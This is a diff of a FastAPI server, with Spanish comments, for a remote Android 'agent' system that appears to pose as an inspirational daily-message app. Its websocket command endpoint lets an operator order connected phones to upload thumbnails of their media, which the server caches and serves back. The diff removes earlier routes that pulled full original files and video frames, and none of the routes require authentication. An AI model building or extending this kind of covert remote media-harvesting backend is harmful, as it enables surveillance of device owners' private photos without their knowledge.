@@ -1,49 +1,38 @@
 import json
-import base64
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import HTMLResponse
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from pydantic import BaseModel
 from typing import List, Dict, Any
+from fastapi.middleware.cors import CORSMiddleware
 from urllib.parse import unquote
 
-app = FastAPI(title="Luz Guía - Backend Android (Definitivo y Completo)")
+app = FastAPI(title="Faro Interior - Backend Android (Completo y Final)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
 # --- "BASES DE DATOS" EN MEMORIA ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
+daily_message_cache: Dict[str, Dict[str, str]] = {}
 device_media_cache: Dict[str, Any] = {}
 fetch_status: Dict[str, str] = {}
-daily_message_cache: Dict[str, Dict[str, str]] = {}
 
-# --- MODELOS DE DATOS CORREGIDOS ---
-class Thumbnail(BaseModel):
-    filename: str
-    filepath: str # <-- ¡CAMBIO CLAVE!
-    small_thumb_b64: str
+# --- MODELOS DE DATOS ---
+class Command(BaseModel):
+    target_id: str; action: str; payload: Any
 
 class Thumbnail(BaseModel):
-    filename: str
-    small_thumb_b64: str
+    filename: str; small_thumb_b64: str
 
 class ThumbnailChunk(BaseModel):
-    thumbnails: List[Thumbnail]
-    is_final_chunk: bool
+    thumbnails: List[Thumbnail]; is_final_chunk: bool
 
 class BroadcastMessage(BaseModel):
-    device_ids: List[str]
-    image_b64: str
-    text: str
-
-class FrameChunk(BaseModel):
-    frame_b64: str
+    device_ids: List[str]; image_b64: str; text: str
 
 # --- ENDPOINTS ---
 
 @app.get("/")
-async def root(): return {"message": "Servidor Luz Guía (Android) activo."}
+async def root(): return {"message": "Servidor del Agente Android activo."}
 
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
@@ -66,13 +55,18 @@ async def get_agents():
 async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
     if not agent: return {"status": "error", "message": "Agente no conectado"}
+    
+    # Si la orden es escanear, reiniciamos la caché y el estado de ese agente
     if command.action == "get_thumbnails":
         device_media_cache[command.target_id] = {}
         fetch_status[command.target_id] = "loading"
+
     try:
         await agent["ws"].send_text(command.json())
         return {"status": "success", "message": "Comando enviado"}
     except Exception as e: return {"status": "error", "message": str(e)}
+
+# --- RUTAS RESTAURADAS PARA EL VISOR DE ARCHIVOS ---
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
@@ -90,44 +84,9 @@ async def get_media_list(device_id: str):
     thumbnails = device_media_cache.get(device_id, {})
     return {"status": status, "thumbnails": thumbnails}
 
-# --- RUTAS RESTAURADAS QUE FUNCIONABAN ---
-@app.post("/api/upload_original_file/{device_id}/{filename:path}")
-async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
-    decoded_filename = unquote(filename)
-    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
-        return Response(content="Archivo no solicitado", status_code=400)
-    file_bytes = await file.read()
-    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
-    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
-    return {"status": "success"}
-
-@app.post("/api/upload_video_frame/{device_id}/{original_filename:path}")
-async def upload_video_frame(device_id: str, original_filename: str, frame: FrameChunk):
-    decoded_filename = unquote(original_filename)
-    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
-        return Response(content="Video no solicitado", status_code=400)
-    if 'frames_b64' not in device_media_cache[device_id][decoded_filename]:
-        device_media_cache[device_id][decoded_filename]['frames_b64'] = []
-    device_media_cache[device_id][decoded_filename]['frames_b64'].append(frame.frame_b64)
-    return {"status": "frame received"}
-
-@app.get("/media/{device_id}/{filename:path}")
-async def get_large_media(device_id: str, filename: str):
-    decoded_filename = unquote(filename)
-    cache = device_media_cache.get(device_id, {})
-    media_item = cache.get(decoded_filename)
-    if not media_item: return Response(content='{"detail":"Contenido no encontrado"}', status_code=404)
-    if 'original_b64' in media_item:
-        try:
-            image_bytes = base64.b64decode(media_item['original_b64'])
-            return Response(content=image_bytes, media_type="image/jpeg")
-        except Exception as e: return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
-    if 'frames_b64' in media_item:
-        html_content = f"<html><body style='background-color:#222;'>" # ... (Tu HTML para frames)
-        return HTMLResponse(content=html_content)
-    return Response(content='{"detail":"Contenido no disponible"}', status_code=404)
 
 # --- RUTAS PARA EL "BUZÓN" DE MENSAJES ---
+
 @app.post("/api/set_daily_message/{device_id}")
 async def set_daily_message(device_id: str, data: dict):
     if "image_b64" in data and "text" in data:
@@ -158,4 +117,5 @@ async def broadcast_message(data: BroadcastMessage):
                 sent_to_count += 1
             except Exception as e:
                 print(f"Error al enviar broadcast a {device_id}: {e}")
+    print(f"Broadcast enviado a {len(data.device_ids)} dispositivos. {sent_to_count} estaban conectados.")
     return {"status": "broadcast attempted", "sent_to": sent_to_count}
